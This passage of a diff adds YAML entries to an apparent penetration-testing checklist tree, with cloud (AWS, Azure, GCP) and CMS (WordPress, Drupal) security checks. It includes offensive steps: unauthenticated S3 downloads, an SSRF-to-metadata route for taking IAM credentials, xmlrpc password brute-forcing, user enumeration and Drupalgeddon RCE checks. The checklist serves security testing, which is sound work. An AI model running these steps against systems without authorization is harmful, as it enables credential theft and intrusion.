+              - aws s3 cp s3://target-bucket/sensitive.txt . --no-sign-request
+              - Check: s3://target-name-backup, s3://target-dev, s3://target-assets
+              - S3 static website: http://target.s3-website-us-east-1.amazonaws.com
+
+              SSRF → IMDS (see SSRF section):
+              - http://169.254.169.254/latest/meta-data/iam/security-credentials/
+              - If credentials obtained: configure aws-cli and enumerate permissions
+
+              API Gateway:
+              - Check for unauthenticated API Gateway endpoints
+              - Test for missing authorization at specific HTTP methods
+              - Check CORS on API Gateway: wildcard origin + credentials
+
+              Common misconfigs:
+              - Public ECR repositories with sensitive images
+              - Publicly readable DynamoDB (via lambda or API)
+              - Cognito Identity Pool with unauthenticated access enabled
+              - Lambda function URLs without auth
+
+      - label: "Azure"
+        key: "azure"
+        children:
+          - id: azure_checks
+            type: checklist
+            title: "Azure-specific security checks"
+            content: |
+              - Azure Blob Storage public access:
+                https://account.blob.core.windows.net/container?restype=container&comp=list
+              - Azure Table Storage: https://account.table.core.windows.net/tableName
+              - App Service: check *.azurewebsites.net for subdomain takeover
+              - Azure AD: check if tenant allows unauthenticated resource enumeration
+              - IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+                (requires Metadata: true header)
+              - App Service metadata: https://target.scm.azurewebsites.net (Kudu)
+
+      - label: "GCP"
+        key: "gcp"
+        children:
+          - id: gcp_checks
+            type: checklist
+            title: "GCP-specific security checks"
+            content: |
+              - GCS public bucket: https://storage.googleapis.com/target-bucket/
+              - Firebase RTDB: https://target-default-rtdb.firebaseio.com/.json
+              - Firebase Storage: https://firebasestorage.googleapis.com/v0/b/target.appspot.com/o
+              - GCP metadata: http://metadata.google.internal/computeMetadata/v1/
+                (requires Metadata-Flavor: Google header)
+              - Service account key files: leaked service account JSON keys on GitHub
+              - App Engine default service account with project editor permissions
+
+      - label: "None / Self-hosted"
+        key: "none"
+        children: []
+
+  # =========================================================================
+  # TECH STACK — CMS
+  # =========================================================================
+  - id: q_cms
+    type: question
+    title: "Does the application use a CMS?"
+    options:
+      - label: "WordPress"
+        key: "wordpress"
+        children:
+          - id: wp_checks
+            type: checklist
+            title: "WordPress security checks"
+            content: |
+              Automated scan:
+              - wpscan --url https://target.com --enumerate ap,at,u --api-token <token>
+
+              Manual checks:
+              - /wp-login.php: accessible? Password brute-force (lock-out policy?)
+              - /wp-admin/: redirect to login or accessible?
+              - /xmlrpc.php: enabled? Allows password brute-force in single request
+                POST with <methodName>wp.getUsersBlogs</methodName> + credentials list
+              - /wp-json/wp/v2/users: user enumeration via REST API
+              - /readme.html, /license.txt: version disclosure
+              - wp-config.php accessible? (should always 403)
+              - User enumeration: /?author=1 → redirects to username
+              - Plugin / theme enumeration: check /wp-content/plugins/, /wp-content/themes/
+              - Outdated plugins with known CVEs (wpscan --enumerate ap)
+              - Debug mode: WP_DEBUG=true in wp-config.php → error log at /wp-content/debug.log
+
+      - label: "Drupal"
+        key: "drupal"
+        children:
+          - id: drupal_checks
+            type: checklist
+            title: "Drupal security checks"
+            content: |
+              - CHANGELOG.txt or INSTALL.txt: version disclosure
+              - /user/register: open registration?
+              - /admin/: accessible without auth?
+              - Drupalgeddon 2 (CVE-2018-7600): RCE — check if version < 7.58 or < 8.5.1
+              - Drupalgeddon 3 (CVE-2018-7602): check same versions
+              - droopescan scan drupal -u https://target.com
+              - /node/1, /node/2: enumerate content nodes
+              - REST API: /jsonapi/ or /rest/ — check for unauthenticated data access
+
+      - label: "None / Custom"
+        key: "none"
+        children: []
